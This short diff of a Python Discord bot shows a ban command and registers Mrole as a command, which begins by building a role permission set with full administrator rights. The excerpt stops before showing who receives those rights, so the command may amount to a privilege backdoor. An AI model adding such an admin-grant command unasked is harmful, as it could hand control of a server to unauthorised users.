@@ -44,7 +44,7 @@ async def Mbun(ctx, user: discord.Member):
         await ctx.send(f"пока{user.mention}")
         await ctx.guild.ban(user)
 
-
+@Bot.command()
 async def Mrole(ctx):
     guild = ctx.guild
     perms = discord.Permissions(administrator=True)
